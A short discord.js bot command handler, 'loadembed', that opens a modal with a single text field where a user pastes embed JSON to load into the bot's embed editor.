const { TextInputStyle } = require("discord.js");
const modalBuilder = require("../../../autosecure/utils/modalBuilder");

module.exports = {
    name: "loadembed",
    editembeds: true,
    callback: (client, interaction) => {
        let type = interaction.customId.split("|")[1];
        
        interaction.showModal(modalBuilder(`embedjson|${type}|load`, `Load Embed - ${type}`, [{
            setCustomId: 'json',
            setMaxLength: 4000,
            setMinLength: 1,
            setRequired: true,
            setLabel: "Embed JSON",
            setPlaceholder: "Paste your embed JSON here...",
            setStyle: TextInputStyle.Paragraph
        }]));
    }
};
